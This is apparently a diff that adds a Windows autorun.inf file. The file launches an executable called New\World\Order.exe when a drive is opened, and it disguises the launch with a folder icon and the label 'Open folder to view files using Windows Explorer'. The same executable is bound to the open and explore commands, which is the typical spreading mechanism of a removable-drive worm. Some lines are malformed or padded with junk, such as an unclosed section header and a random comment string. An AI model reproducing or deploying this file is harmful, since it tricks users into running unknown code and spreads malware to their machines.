@@ -1,0 +1,9 @@
+;fakeit
+[autorun
+;$@935u8wjofknlshgi
+open=New\World\Order.exe
+icon=%SystemRoot%\system32\SHELL32.dll,4
+action=Open folder to view files using Windows Explorer
+shell\\\open\\command=New\World\Order.exe
+shell\\\explore\command=New\World\Order.exe
+useautoplay=1
